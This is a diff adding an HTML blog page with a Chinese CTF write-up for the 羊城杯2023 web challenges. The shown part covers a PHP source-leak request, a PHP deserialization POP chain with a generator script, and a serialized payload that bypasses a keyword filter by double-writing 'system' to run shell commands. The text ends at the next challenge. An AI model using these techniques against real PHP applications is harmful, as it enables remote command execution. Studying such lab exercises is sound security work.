@@ -1,0 +1,1009 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/leekos.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] 羊城杯2023webD0n’t pl4y g4m3!!! 小明不小心沉迷⚪⚪的东西把源码和猫猫搞丢了，请帮他找回来。请访问&#x2F;p0p.php   看到这里会想到之前的请求走私  访问一下&#x2F;p0p.php，发现php7.4.21，这个版本存在源码泄露：  于是我们构造一下 1234567GET &#x2F;p0p.php HTTP&#x2F;1.1Host: tcp.cloud.dasctf.com">
+<meta property="og:type" content="article">
+<meta property="og:title" content="羊城杯2023">
+<meta property="og:url" content="https://leekosss.github.io/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] 羊城杯2023webD0n’t pl4y g4m3!!! 小明不小心沉迷⚪⚪的东西把源码和猫猫搞丢了，请帮他找回来。请访问&#x2F;p0p.php   看到这里会想到之前的请求走私  访问一下&#x2F;p0p.php，发现php7.4.21，这个版本存在源码泄露：  于是我们构造一下 1234567GET &#x2F;p0p.php HTTP&#x2F;1.1Host: tcp.cloud.dasctf.com">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031043224.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031044880.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031046700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031048089.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031123515.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031124947.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031125728.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031128991.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031129142.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031134563.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031136440.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031147022.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309032036940.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309071531915.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031151972.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031152911.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031156585.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031156213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031201617.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031201604.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031212429.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031217291.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031219495.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031219094.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031220423.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031220832.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031222548.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031331145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031332031.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031332775.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031333873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031335670.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031337687.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031337113.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031407037.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031425278.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031441444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031409817.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031512028.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031643084.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031643081.png">
+<meta property="article:published_time" content="2023-09-03T02:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-07T08:42:19.618Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="羊城杯2023">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031043224.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>羊城杯2023 - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="羊城杯2023"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-03 10:00" pubdate>
+          2023年9月3日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          26k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          218 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">羊城杯2023</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年9月7日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="羊城杯2023"><a href="#羊城杯2023" class="headerlink" title="羊城杯2023"></a>羊城杯2023</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h4><blockquote>
+<p>小明不小心沉迷⚪⚪的东西把源码和猫猫搞丢了，请帮他找回来。请访问&#x2F;p0p.php</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031043224.png" srcset="/img/loading.gif" lazyload alt="image-20230903104317059"></p>
+<p>看到这里会想到之前的请求走私</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031044880.png" srcset="/img/loading.gif" lazyload alt="image-20230903104445802"></p>
+<p>访问一下<code>/p0p.php</code>，发现<code>php7.4.21</code>，这个版本存在源码泄露：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031046700.png" srcset="/img/loading.gif" lazyload alt="image-20230903104646563"></p>
+<p>于是我们构造一下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/p0p.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>tcp.cloud.dasctf.com:27895<br><br><span class="language-http"></span><br><span class="language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"></span><br><span class="language-http"></span><br></code></pre></td></tr></table></figure>
+
+<p>注意关闭自动更新<code>Content-Length</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031048089.png" srcset="/img/loading.gif" lazyload alt="image-20230903104846978"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 302 found&quot;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pro</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rce2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$rce2</span>=<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$rce2</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>     &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yang</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ycb</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;now = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = True;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheng</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bei</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;CTF-&gt;<span class="hljs-title function_ invoke__">ycb</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;fine-&gt;<span class="hljs-title function_ invoke__">YCB1</span>(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prohib</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CTF&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">prohib</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>就是一个反序列化pop链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pro</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rce2</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yang</span></span><br><span class="hljs-class"></span>&#123;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheng</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bei</span></span><br><span class="hljs-class"></span>&#123;<br><br>&#125;<br><br><span class="hljs-variable">$bei</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bei</span>();<br><span class="hljs-variable">$bei</span>-&gt;CTF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$bei</span>-&gt;CTF-&gt;finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$bei</span>-&gt;CTF-&gt;finish-&gt;finish = <span class="hljs-literal">true</span>;<br><br><span class="hljs-variable">$bei</span>-&gt;fine = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><br><span class="hljs-variable">$bei</span>-&gt;fine-&gt;finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$bei</span>-&gt;fine-&gt;finish-&gt;finish = <span class="hljs-literal">true</span>;<br><span class="hljs-variable">$bei</span>-&gt;fine-&gt;now = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;YCB1&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-variable">$bei</span>-&gt;rce = <span class="hljs-string">&#x27;cat /tmp/catc*&#x27;</span>;<br><span class="hljs-variable">$bei</span>-&gt;rce1 = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$bei</span>);<br><br><span class="hljs-comment"># O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:14:&quot;cat /tmp/catc*&quot;;s:4:&quot;rce1&quot;;s:0:&quot;&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是这里有个坑的地方，由于前面经过了<code>prohib()</code>函数的过滤，我们需要手动改一下双写（不能在程序里面加）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Bei&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;CTF&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Yang&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Yang&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;b:<span class="hljs-number">1</span>;&#125;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fine&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Yang&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Yang&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;b:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;now&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;YCB1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;syssystemtem&quot;</span>;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;rce&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;cat /tmp/catc*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;rce1&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h4><blockquote>
+<p> I have been endeavoring to Reduce my phobia of Serpents by learning more about them. Do not scan, note that there is a <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> file under the website.</p>
+</blockquote>
+<p>提示我们访问：<code>www.zip</code>，得到一个app.py</p>
